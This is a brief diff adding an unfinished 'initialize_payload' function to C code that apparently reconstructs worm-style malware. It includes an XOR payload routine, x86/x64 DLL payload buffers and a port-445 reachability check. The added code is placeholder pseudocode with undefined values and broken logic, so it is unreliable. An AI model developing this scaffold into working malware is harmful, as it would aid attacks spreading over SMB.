@@ -24,6 +24,30 @@ int xor_payload(int xor_key, int buf, int size)
 	return 0;
 }
 
+//init the DLL payload here
+int initialize_payload()
+{
+	DWORD fileSize;
+	//size = 0x4060
+	HGLOBAL hMemory_x86 = GlobalAlloc(GMEM_ZEROINIT, UNKNOWN);
+	
+	//size = 0xc8a4
+	HGLOBAL hMemory_x646 = GlobalAlloc(GMEM_ZEROINIT, UNKNOWN);
+	
+	if(something_happens_here)
+	{
+		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
+		if(fileHandle != INVALID_FILE_HANDLE)
+		{
+			fileSize = GetFileSize(fileHandle, NULL);
+			abort();
+		}
+		GlobalFree(hMemory_x86);
+		GlobalFree(hMemory_x646);
+		return NULL;
+	}
+}
+
 //https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
 int canConnectToPort445(char *ip)
 {
